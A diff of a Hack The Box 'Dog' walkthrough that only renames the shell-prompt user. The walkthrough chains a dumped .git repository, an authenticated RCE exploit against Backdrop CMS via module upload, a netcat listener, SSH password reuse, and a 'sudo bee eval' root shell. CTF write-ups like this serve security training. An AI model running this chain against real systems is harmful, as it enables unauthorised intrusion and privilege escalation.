@@ -12,7 +12,7 @@
 ## 🛰️ Ping Test
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$ ping -c 4 -A  10.129.11.161
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$ ping -c 4 -A  10.129.11.161
 PING 10.129.11.161 (10.129.11.161) 56(84) bytes of data.
 64 bytes from 10.129.11.161: icmp_seq=1 ttl=63 time=309 ms
 64 bytes from 10.129.11.161: icmp_seq=2 ttl=63 time=242 ms
@@ -27,7 +27,7 @@ rtt min/avg/max/mdev = 240/263/309/32 ms
 ## 🔍 Reconnaissance
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 sudo nmap -sV -sC 10.129.11.161
 ```
 
@@ -60,7 +60,7 @@ Fuzzing reveals an exposed **.git** directory.
 Using GitDumper:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 ./gitdumper.sh http://10.129.11.161/.git/ extracted_repo
 ```
 
@@ -69,7 +69,7 @@ The repository is successfully downloaded.
 ### Dump Contents
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 ls extracted_repo
 core/ files/ index.php layouts/ LICENSE.txt README.md robots.txt settings.php sites/ themes/
 ```
@@ -81,7 +81,7 @@ core/ files/ index.php layouts/ LICENSE.txt README.md robots.txt settings.php si
 Searching inside the repository:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 grep -R "@dog" -n .
 ```
 
@@ -101,14 +101,14 @@ Backdrop CMS **1.27.1** is vulnerable to **Authenticated RCE** via malicious mod
 Exploit tool:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 python3 dog-rce.py http://10.129.11.161/
 ```
 
 This generates `shell.zip`. Backdrop does not allow ZIP uploads, so convert it:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 unzip shell.zip -d temp_dir
 tar -czf shell.tar.gz -C temp_dir .
 rm -rf temp_dir
@@ -125,7 +125,7 @@ http://10.129.11.161/?q=admin/modules/install
 Open listener:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 nc -lvnp 4444
 ```
 
@@ -144,14 +144,14 @@ We get **www-data** shell.
 Password reuse allows switching to user **johncusack**:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 ssh johncusack@10.129.11.161
 ```
 
 Retrieve user flag:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 cat ~/user.txt
 ```
 
@@ -162,7 +162,7 @@ cat ~/user.txt
 Check sudo permissions:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 sudo -l
 ```
 
@@ -177,7 +177,7 @@ User `johncusack` can run:
 Execute arbitrary system command:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 sudo bee eval 'system("/bin/bash");'
 ```
 
@@ -186,7 +186,7 @@ We now have a **root shell**.
 Retrieve root flag:
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
+pluto@kali:/home/pluto/Desktop/htb/machines/dog$
 cat /root/root.txt
 ```
 
